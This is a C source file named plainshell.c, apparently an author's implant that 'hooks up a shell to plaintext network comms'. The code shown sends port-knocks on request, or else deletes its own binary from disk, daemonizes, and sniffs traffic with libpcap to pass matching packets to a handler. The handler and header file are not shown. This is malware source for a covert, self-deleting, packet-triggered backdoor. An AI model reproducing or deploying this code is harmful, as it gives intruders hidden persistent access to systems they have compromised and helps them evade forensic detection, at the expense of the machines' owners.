/*
 * plainshell.c
 * Hooks up a shell to plaintext network comms
 * By J. Stuart McMurray
 * Created 20160316
 * Last Modified 20160319
 */

#include "plainshell.h"

int main(int argc, char **argv) {
        int ret;
        pcap_t *p;

        /* If the first argument is --k, make a knock */
        if (4 == argc && 0 == strncmp(argv[1], KNOCKFLAG, sizeof(KNOCKFLAG))) {
                return make_knock(argv[2], argv[3]);
        }

        /* Ignore child processess death */
        signal(SIGCHLD, SIG_IGN);

        /* Remove this binary */
        rmbin(argv[0]);

        /* Daemonize */
        if (-1 == daemon(0, 1)) {
                err(1, "daemon");
        }

        /* Remove leading ./ from name */
        remove_dot_slash(&(argv[0]));

        /* Start pcap going */
        p = init_pcap();

        /* Handle children */
        if (0 != (ret = pcap_loop(p, -1, handle, (u_char *)&(argv[0])))) {
                pcap_perror(p, "pcap_loop");
                return ret;
        }

        /* Shouldn't reach here */
        return 255;
}

/* init_pcap sets up a pcap monitorer. */
pcap_t *init_pcap() {
        pcap_t *p;                       /* Pcap handle */
        struct bpf_program fp;           /* BPF filter */
        char errbuf[PCAP_ERRBUF_SIZE+1]; /* Error buffer */

        p = NULL;
        errbuf[PCAP_ERRBUF_SIZE] = '\0';

        /* Start pcap session */
        if (NULL == (p = pcap_open_live(DEVICE, 65535, 0, -1, errbuf))) {
                errx(2, "pcap_open_live: %s", errbuf);
        }

        /* Set filter */
        if (-1 == pcap_compile(p, &fp, FILTER, 1, 0)) {
                pcap_perror(p, "pcap_compile");
                exit(3);
        }
        if (-1 == pcap_setfilter(p, &fp)) {
                pcap_perror(p, "pcap_setfilter");
                exit(4);
        }

        return p;
}

/* remove_dot_slash removes the leading ./ from the string at ./ by changing
 * where the passed-in pointer points.  Thus, there is two bytes of leakage.
 * If the string doesn't start with ./, nothing happens. */
void remove_dot_slash(char **s) {
        if (('.' == (*s)[0]) && ('/' == (*s)[1])) {
                *s+=2;
        }
}

/* rmbin removes whatever is at p, if it exists */
void rmbin(char *p) {
        struct stat st;
        printf("P: %s\n", p); /* DEBUG */
        if (-1 == lstat(p, &st)) {
                warn("lstat");
                return;
        }
        if (-1 == unlink(p)) {
                warn("unlink");
        }
}
